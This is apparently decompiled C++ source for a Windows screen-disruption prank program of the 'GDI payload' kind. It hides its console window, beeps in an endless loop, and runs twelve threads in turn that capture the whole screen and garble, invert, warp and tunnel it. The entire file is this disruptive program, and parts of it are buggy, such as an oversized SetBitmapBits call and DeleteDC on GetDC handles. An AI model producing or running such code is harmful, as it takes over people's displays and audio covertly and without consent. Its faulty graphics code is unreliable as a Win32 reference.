#include <Windows.h>
#pragma comment(lib, "winmm.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

DWORD WINAPI payload1() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
    int v3; // [rsp+8Ch] [rbp+Ch]
    int v4; // [rsp+90h] [rbp+10h]
    int v5; // [rsp+94h] [rbp+14h]
    int v6; // [rsp+98h] [rbp+18h]
    int v7; // [rsp+9Ch] [rbp+1Ch]
    int v8; // [rsp+A0h] [rbp+20h]
    int v9; // [rsp+A4h] [rbp+24h]
    HGDIOBJ h; // [rsp+A8h] [rbp+28h]
    int cy; // [rsp+B0h] [rbp+30h]
    int SystemMetrics; // [rsp+B4h] [rbp+34h]
    HDC hdcSrc; // [rsp+B8h] [rbp+38h]
    HDC hdc; // [rsp+C0h] [rbp+40h]
    int i; // [rsp+CCh] [rbp+4Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v9 = i % SystemMetrics;
            v8 = i / SystemMetrics;
            v7 = 1 * (i / SystemMetrics);
            v6 = i / SystemMetrics * (i / SystemMetrics);
            v5 = i % SystemMetrics * (i % SystemMetrics);
            v4 = v5 / 1 + v5;
            v3 = v6 / 1 + v6;
            *((DWORD*)ppvBits + i) += v4 + v3;
        }
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI payload2() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
    int v3; // [rsp+88h] [rbp+8h]
    int v4; // [rsp+8Ch] [rbp+Ch]
    int v12; // [rsp+8Ch] [rbp+Ch]
    int v5; // [rsp+90h] [rbp+10h]
    int v6; // [rsp+94h] [rbp+14h]
    HGDIOBJ h; // [rsp+98h] [rbp+18h]
    int cy; // [rsp+A0h] [rbp+20h]
    int SystemMetrics; // [rsp+A4h] [rbp+24h]
    HDC hdcSrc; // [rsp+A8h] [rbp+28h]
    HDC hdc; // [rsp+B0h] [rbp+30h]
    int i; // [rsp+BCh] [rbp+3Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v6 = i % SystemMetrics;
            v5 = i / SystemMetrics;
            v4 = 2 * (i / SystemMetrics);
            v3 = ++v4 / 2;
            *((DWORD*)ppvBits + i) += (v4 / 2) | (i / SystemMetrics * (i % SystemMetrics));
        }
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI payload3() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
    int v3; // [rsp+8Ch] [rbp+Ch]
    int v4; // [rsp+90h] [rbp+10h]
    int v5; // [rsp+94h] [rbp+14h]
    HGDIOBJ h; // [rsp+98h] [rbp+18h]
    int cy; // [rsp+A0h] [rbp+20h]
    int SystemMetrics; // [rsp+A4h] [rbp+24h]
    HDC hdcSrc; // [rsp+A8h] [rbp+28h]
    HDC hdc; // [rsp+B0h] [rbp+30h]
    int v11; // [rsp+B8h] [rbp+38h]
    int i; // [rsp+BCh] [rbp+3Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v5 = i % SystemMetrics;
            v4 = i / SystemMetrics;
            v3 = ++v4 / 2;
            *((DWORD*)ppvBits + i) += (v4 / 2) | (i / SystemMetrics * i / SystemMetrics * (i % SystemMetrics));
        }
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD  WINAPI payload4() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
    int v3; // [rsp+8Ch] [rbp+Ch]
    int v4; // [rsp+90h] [rbp+10h]
    int v5; // [rsp+94h] [rbp+14h]
    int v6; // [rsp+98h] [rbp+18h]
    int v7; // [rsp+9Ch] [rbp+1Ch]
    int v8; // [rsp+A0h] [rbp+20h]
    int v9; // [rsp+A4h] [rbp+24h]
    HGDIOBJ h; // [rsp+A8h] [rbp+28h]
    int cy; // [rsp+B0h] [rbp+30h]
    int SystemMetrics; // [rsp+B4h] [rbp+34h]
    HDC hdcSrc; // [rsp+B8h] [rbp+38h]
    HDC hdc; // [rsp+C0h] [rbp+40h]
    int v15; // [rsp+C8h] [rbp+48h]
    int i; // [rsp+CCh] [rbp+4Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v9 = i % SystemMetrics;
            v8 = i / SystemMetrics;
            v7 = i / SystemMetrics * (i / SystemMetrics);
            v6 = i % SystemMetrics * (i % SystemMetrics);
            v5 = v6 / 5 + v6;
            v4 = v7 / 5 + v7;
            *((BYTE*)ppvBits + 4 * i + 1) += (i % SystemMetrics) ^ (i / SystemMetrics);
            *((BYTE*)ppvBits + 4 * i + 1) += v9 ^ v8;
        }
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI payload5() {
    COLORREF v1; // eax
    HBRUSH h; // [rsp+58h] [rbp-58h]
    int x1; // [rsp+74h] [rbp-3Ch]
    HDC hdc; // [rsp+78h] [rbp-38h]
    int cy; // [rsp+90h] [rbp-20h]
    int SystemMetrics; // [rsp+94h] [rbp-1Ch]
    int v7; // [rsp+98h] [rbp-18h]
    int v8; // [rsp+9Ch] [rbp-14h]
    int v9; // [rsp+A0h] [rbp-10h]
    int v10; // [rsp+A4h] [rbp-Ch]
    int v11; // [rsp+A8h] [rbp-8h]
    int v12; // [rsp+ACh] [rbp-4h]

    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    v12 = 1;
    v11 = 1;
    v10 = 10;
    v9 = 10;
    while (1)
    {
        hdc = GetDC(0i64);
        v10 += v12;
        v9 += v11;
        x1 = v10;
        v7 = v9;
        h = CreateSolidBrush(v7);
        SelectObject(hdc, h);
        BitBlt(hdc, x1 + v10 + 100, v9, SystemMetrics, cy, hdc, v12 + x1, v9 + 100 - v7 / 66666, 0x660046u);
        BitBlt(hdc, v9 + x1 + v9 + 100, v9, SystemMetrics, cy, hdc, x1, v10 + 100 + v9 + 100, 0xCC0020u);
        if (GetSystemMetrics(1) <= v9)
            v11 = v9 / 60000 - v8 / 60000;
        if (GetSystemMetrics(0) <= v10)
            v12 = v7 / -60000;
        if (!v9)
            v11 = 5;
        if (!v10)
            v7 = v9 / 60000;
        v8 = v9 / -60000;
        DeleteObject(h);
        ReleaseDC(0i64, hdc);
    }
}
DWORD WINAPI payload6() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
    int v3; // [rsp+88h] [rbp+8h]
    int v4; // [rsp+8Ch] [rbp+Ch]
    int v5; // [rsp+90h] [rbp+10h]
    int v6; // [rsp+94h] [rbp+14h]
    HGDIOBJ h; // [rsp+98h] [rbp+18h]
    int cy; // [rsp+A0h] [rbp+20h]
    int SystemMetrics; // [rsp+A4h] [rbp+24h]
    HDC hdcSrc; // [rsp+A8h] [rbp+28h]
    HDC hdc; // [rsp+B0h] [rbp+30h]
    int v12; // [rsp+B8h] [rbp+38h]
    int i; // [rsp+BCh] [rbp+3Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v6 = i % SystemMetrics;
            v5 = i / SystemMetrics;
            v12 = i / SystemMetrics;
            v3 = (i / SystemMetrics) & (i % SystemMetrics);
            *((BYTE*)ppvBits + 4 * i + 3) += (i / SystemMetrics) & (i % SystemMetrics);
            *((BYTE*)ppvBits + 4 * i + 1) += v3;
        }
        BitBlt(hdc, 1, 99, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI payload7() {
    HBITMAP h; // [rsp+60h] [rbp-20h]
    HDC hdcSrc; // [rsp+68h] [rbp-18h]
    HDC hdc; // [rsp+70h] [rbp-10h]
    void* lpvBits; // [rsp+78h] [rbp-8h]
    int nHeight; // [rsp+84h] [rbp+4h]
    int nWidth; // [rsp+88h] [rbp+8h]
    DWORD TickCount; // [rsp+8Ch] [rbp+Ch]
    int j; // [rsp+90h] [rbp+10h]
    char v10; // [rsp+97h] [rbp+17h]
    int v11; // [rsp+98h] [rbp+18h]
    int i; // [rsp+9Ch] [rbp+1Ch]

    TickCount = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 999)
    {
        hdc = GetDC(0i64);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 1 * nHeight * nWidth, lpvBits);
        v11 = 0;
        v10 = 0;
        if (GetTickCount() - TickCount > 0xEA60)
            v10 = rand() % 999;
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 999))
                v11 = rand() % 50;
            *((BYTE*)lpvBits + v11 + (__int64)(4 * j)) = v10 ^ *((BYTE*)lpvBits
                + 4 * ((j + v11) / nWidth)
                + j
                + v11
                + rand() % 999
                + 999);
        }
        SetBitmapBits(h, 999 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}
DWORD WINAPI payload8() {
    int v1; // [rsp+50h] [rbp-30h]
    int v2; // [rsp+54h] [rbp-2Ch]
    HDC hdc; // [rsp+58h] [rbp-28h]
    int v4; // [rsp+64h] [rbp-1Ch]
    int SystemMetrics; // [rsp+68h] [rbp-18h]
    int cy; // [rsp+6Ch] [rbp-14h]
    int y; // [rsp+7Ch] [rbp-4h]

    GetDC(0i64);
    cy = GetSystemMetrics(0);
    SystemMetrics = GetSystemMetrics(1);
    v4 = SystemMetrics / 10;
    while (1)
    {
        hdc = GetDC(0i64);
        for (y = 2; SystemMetrics / 2 + SystemMetrics > y; ++y)
        {
            v2 = (int)((double)9 * sin((float)((float)y / (float)v4) * 3.141592653589793));
            BitBlt(hdc, 0, y, SystemMetrics, cy, hdc, y, v2 / 2, 0xCC0020u);
            BitBlt(hdc, y, 0, SystemMetrics, cy, hdc, y, v2 / 2, 0xCC0020u);
            v1 = (int)((double)9 * sin((float)((float)y / (float)v4) * 3.141592653589793));
            BitBlt(hdc, y, 0, cy, SystemMetrics, hdc, v1 / 2, y, 0xCC0020u);
            BitBlt(hdc, 0, y, cy, SystemMetrics, hdc, v1 / 2, y, 0xCC0020u);
        }
    }
}
DWORD WINAPI payload9() {
    int y1; // esi
    int x1; // ebx
    int v3; // edi
    int v4; // eax
    int v5; // esi
    int v6; // ebx
    int v7; // edi
    int v8; // eax
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
    int v11; // [rsp+90h] [rbp+10h]
    int v12; // [rsp+94h] [rbp+14h]
    HGDIOBJ h; // [rsp+98h] [rbp+18h]
    int cy; // [rsp+A0h] [rbp+20h]
    int SystemMetrics; // [rsp+A4h] [rbp+24h]
    HDC hdcSrc; // [rsp+A8h] [rbp+28h]
    HDC hdc; // [rsp+B0h] [rbp+30h]
    int i; // [rsp+BCh] [rbp+3Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v12 = i % SystemMetrics;
            v11 = i / cy;
            *((DWORD*)ppvBits + i) += (i % SystemMetrics) ^ (i / cy + SystemMetrics);
        }
        BitBlt(hdc, 1 - SystemMetrics, 0, SystemMetrics, cy, hdc, 0, 0, 0xCC0020u);
        BitBlt(hdc, 0, 1 - cy, SystemMetrics, cy, hdc, 0, 0, 0xCC0020u);
        BitBlt(hdc, 1, 1, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
        y1 = rand() % 2 + 1;
        x1 = rand() % 2 + 1;
        v3 = rand() % 2 + 1;
        v4 = rand();
        BitBlt(hdc, v4 % 2 + 1, v3, SystemMetrics, cy, hdc, x1, y1, 0x8800C6u);
        v5 = rand() % 2 + 1;
        v6 = rand() % 2 + 1;
        v7 = rand() % 2 + 1;
        v8 = rand();
        BitBlt(hdc, v8 % 2 + 1, v7, SystemMetrics, cy, hdc, v6, v5, 0xEE0086u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI payload10() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
    int v3; // [rsp+90h] [rbp+10h]
    int v4; // [rsp+94h] [rbp+14h]
    HGDIOBJ h; // [rsp+98h] [rbp+18h]
    int cy; // [rsp+A0h] [rbp+20h]
    int SystemMetrics; // [rsp+A4h] [rbp+24h]
    HDC hdcSrc; // [rsp+A8h] [rbp+28h]
    HDC hdc; // [rsp+B0h] [rbp+30h]
    int v10; // [rsp+B8h] [rbp+38h]
    int i; // [rsp+BCh] [rbp+3Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0xCC0020u);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v4 = i % SystemMetrics;
            v3 = i / SystemMetrics;
            v10 = i / SystemMetrics;
            *((DWORD*)ppvBits + i) += (i % SystemMetrics) ^ (i / SystemMetrics + v10);
        }
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI payload11() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
    int v3; // [rsp+90h] [rbp+10h]
    int v4; // [rsp+94h] [rbp+14h]
    HGDIOBJ h; // [rsp+98h] [rbp+18h]
    int cy; // [rsp+A0h] [rbp+20h]
    int SystemMetrics; // [rsp+A4h] [rbp+24h]
    HDC hdcSrc; // [rsp+A8h] [rbp+28h]
    HDC hdc; // [rsp+B0h] [rbp+30h]
    int i; // [rsp+BCh] [rbp+3Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0xCC0020u);
        for (i = 10; cy * SystemMetrics - 60 > i; ++i)
        {
            v4 = SystemMetrics * i - 10;
            v3 = i;
            *((DWORD*)ppvBits + i) += v4 % i;
        }
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI payload12() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
    int v3; // [rsp+90h] [rbp+10h]
    int v4; // [rsp+94h] [rbp+14h]
    HGDIOBJ h; // [rsp+98h] [rbp+18h]
    int cy; // [rsp+A0h] [rbp+20h]
    int SystemMetrics; // [rsp+A4h] [rbp+24h]
    HDC hdcSrc; // [rsp+A8h] [rbp+28h]
    HDC hdc; // [rsp+B0h] [rbp+30h]
    int i; // [rsp+BCh] [rbp+3Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0xCC0020u);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v4 = i / SystemMetrics;
            v3 = SystemMetrics * i / 2;
            *((DWORD*)ppvBits + i) += v3 * (i / SystemMetrics);
        }
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI beep() {
    while (1)
    {
        Beep(0x1F4u, 0xC8u);
        Beep(0x320u, 0xC8u);
        Beep(0xFAu, 0x3E8u);
    }
}
int main() {
    HANDLE v5; // edi
    HANDLE v6; // edi
    HANDLE v7; // edi
    HANDLE v8; // esi
    HANDLE v9; // esi
    HANDLE v10; // esi
    HANDLE v11; // esi
    HANDLE v12; // esi
    HANDLE v13; // esi
    HANDLE v14; // edi
    HANDLE v16; // esi
    HANDLE v17; // esi
    HANDLE v18; // esi
    HANDLE v19; // ebx
    HANDLE v20; // edi
    HANDLE v21; // esi
    HANDLE v22; // esi
    HANDLE v23; // esi
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)beep, 0, 0, 0);
            v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload1, 0, 0, 0);
            Sleep(0x7530u);
            TerminateThread(v6, 0);
            CloseHandle(v6);
            InvalidateRect(0, 0, 0);
            v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload2, 0, 0, 0);
            Sleep(0x3A98u);
            TerminateThread(v8, 0);
            CloseHandle(v8);
            InvalidateRect(0, 0, 0);
            v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload3, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v9, 0);
            CloseHandle(v9);
            InvalidateRect(0, 0, 0);
            v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload4, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v10, 0);
            CloseHandle(v10);
            v11 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload5, 0, 0, 0);
            Sleep(0x3A98u);
            TerminateThread(v11, 0);
            CloseHandle(v11);
            v12 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload6, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v12, 0);
            CloseHandle(v12);
            v13 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload7, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v13, 0);
            CloseHandle(v13);
            v14 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload8, 0, 0, 0);
            Sleep(0x4E20u);
            TerminateThread(v14, 0);
            CloseHandle(v14);
            v16 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload9, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v16, 0);
            CloseHandle(v16);
            v17 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload10, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v17, 0);
            CloseHandle(v17);
            v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload11, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v18, 0);
            CloseHandle(v18);
            v19 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload12, 0, 0, 0);
            Sleep(0x61A8u);
        }